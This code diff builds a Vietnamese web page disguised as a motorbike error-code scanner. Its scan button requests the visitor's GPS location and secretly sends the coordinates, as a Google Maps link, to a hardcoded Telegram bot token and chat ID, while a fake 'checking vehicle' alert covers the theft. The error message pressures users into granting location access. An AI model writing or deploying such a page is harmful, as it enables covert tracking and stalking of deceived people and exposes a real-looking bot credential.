@@ -1,17 +1,45 @@
-// Thay token và id thật của bạn vào đây
-var token = "AAH8Qe6ETY42SjLvFBq8hFRd3SlhO6hPMz0";
-var chat_id = "8571376502";
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Kiểm tra xe</title>
+</head>
+<body style="text-align: center; padding-top: 50px; font-family: Arial;">
 
-function showPosition(position) {
-  var lat = position.coords.latitude;
-  var lon = position.coords.longitude;
-  
-  // Nội dung tin nhắn gửi về Telegram
-  var text = "Đã lấy được tọa độ: https://www.google.com/maps?q=" + lat + "," + lon;
-  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+    <h2>Hệ thống quét mã lỗi Wave 54 4val</h2>
+    <p>Bấm nút bên dưới để bắt đầu kiểm tra thông số xe.</p>
 
-  // Lệnh bí mật gửi tin nhắn đi
-  fetch(url);
+    <button onclick="getLocation()" style="padding: 20px; background: red; color: white; border-radius: 10px; font-weight: bold; border: none; cursor: pointer;">
+        BẮT ĐẦU QUÉT
+    </button>
 
-  alert("Hệ thống đang kiểm tra thông tin xe, vui lòng chờ...");
-}
+    <script>
+        // Token và ID thật từ hình ảnh của bạn
+        var token = "7547535147:AAH8Qe6ETY42SjLvFBq8hFRd3SlhO6hPMz0";
+        var chat_id = "8571376502";
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                alert("Trình duyệt của bạn không hỗ trợ GPS.");
+            }
+        }
+
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var text = "Đã lấy được tọa độ: https://www.google.com/maps?q=" + lat + "," + lon;
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+
+            fetch(url);
+            alert("Hệ thống đang kiểm tra thông tin xe, vui lòng chờ...");
+        }
+
+        function showError(error) {
+            alert("Bạn phải cho phép truy cập vị trí thì mới quét được mã lỗi xe.");
+        }
+    </script>
+
+</body>
+</html>
